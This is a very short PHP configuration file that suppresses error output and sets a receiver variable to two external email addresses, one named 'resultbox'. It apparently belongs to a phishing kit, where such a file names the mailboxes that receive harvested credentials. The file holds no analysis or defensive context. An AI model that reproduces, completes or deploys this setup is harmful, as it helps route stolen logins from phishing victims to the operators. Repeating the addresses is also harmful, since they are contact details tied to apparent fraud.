<?php
ini_set('display_errors', 0);
$receiverAddress = "italkmoni@gmail.com,resultbox.2018@zoho.com";


?>